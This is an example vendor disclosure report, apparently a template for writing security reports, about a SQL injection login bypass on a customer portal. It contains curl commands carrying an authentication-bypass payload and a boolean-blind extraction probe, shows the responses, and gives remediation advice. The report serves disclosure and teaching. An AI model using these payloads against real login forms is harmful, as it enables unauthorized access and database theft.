---
description: "Example: direct vendor submission for SQL injection auth bypass on a customer portal login form"
skill: report-generation
category: Disclosure & Reporting Formats
---

**Title:** SQL injection in customer portal login allows unauthenticated database read

**Severity:** Critical — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N (9.1)

---

### Summary

The customer portal's login form concatenates the `username` field directly into the authentication query, and an unauthenticated visitor uses it to both bypass login and read arbitrary rows from the accounts table. I tried the password field first since that's the more obvious target, but it turned out parameterized; the username field was the one still built with string concatenation. A single payload logs in as whichever account the query happens to return first — on this instance, that's the portal administrator.

### Steps to Reproduce

1. Send a normal login attempt as a control, to confirm the baseline failure message:
```
curl -s -X POST https://portal.example.com/login \
  -d "username=nobody&password=wrong"
```
2. Send the same request with a boolean payload in the username field instead of a real value:
```
curl -s -X POST https://portal.example.com/login \
  -d "username=' OR '1'='1' -- &password=anything"
```
3. The response is a 302 redirect to `/dashboard` with a `Set-Cookie` for an authenticated session — no valid credentials were supplied.
4. Confirm the query is a general read primitive, not just an auth-check quirk, with a boolean-blind probe on the same field:
```
curl -s -X POST https://portal.example.com/login \
  -d "username=' AND (SELECT LENGTH(password_hash) FROM accounts WHERE username='admin')=60 -- &password=x"
```

### Evidence

```
$ curl -s -i -X POST https://portal.example.com/login -d "username=nobody&password=wrong" | head -3
HTTP/1.1 200 OK
...
Invalid username or password.                                    <-- control: normal failure path

$ curl -s -i -X POST https://portal.example.com/login \
    -d "username=' OR '1'='1' -- &password=anything" | head -3
HTTP/1.1 302 Found
Location: /dashboard
Set-Cookie: session=eyJhbGciOi...                                 <-- authenticated without credentials

$ curl -s -i -X POST https://portal.example.com/login \
    -d "username=' AND (SELECT LENGTH(password_hash) FROM accounts WHERE username='admin')=60 -- &password=x" | head -3
HTTP/1.1 302 Found
Location: /dashboard                                              <-- true branch: length guess correct
```

### Attack Scenario

An unauthenticated visitor to the portal's public login page submits a crafted username field instead of real credentials. The query returns the administrator's row first, so the visitor lands in the admin dashboard with no password. The same injection point supports arbitrary boolean-blind extraction, so the attacker isn't limited to whichever account the login query happens to prefer.

### Impact

Unauthenticated login as the portal administrator, and full database read through the same injection point — proved here by extracting the stored password hash length for the `admin` row via the boolean oracle. Because the query returns whatever row it matches first, this isn't scoped to one account: any username in the table is reachable the same way.

### Remediation

Parameterize the login query — bind `username` and `password` through prepared-statement placeholders instead of string concatenation; this is the only fix, not a mitigation. Add a WAF rule blocking SQL metacharacters on the login endpoint as defense-in-depth while the code fix rolls out.

**Researcher:** Priya Natarajan — priya.natarajan@research.example
